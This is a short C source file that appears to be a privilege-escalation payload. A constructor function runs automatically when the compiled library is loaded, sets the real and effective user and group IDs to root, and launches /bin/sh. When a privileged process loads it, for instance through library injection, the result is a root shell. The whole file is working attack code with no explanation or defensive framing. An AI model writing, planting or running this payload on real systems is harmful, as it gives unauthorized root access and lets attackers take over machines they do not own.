#include <stdio.h>
#include <unistd.h>
void __attribute__((constructor)) setup() {
  printf("Hello");
  setreuid(0, 0);
  setregid(0, 0);
  char *empty[] = {NULL};
  execve("/bin/sh", empty, empty);
}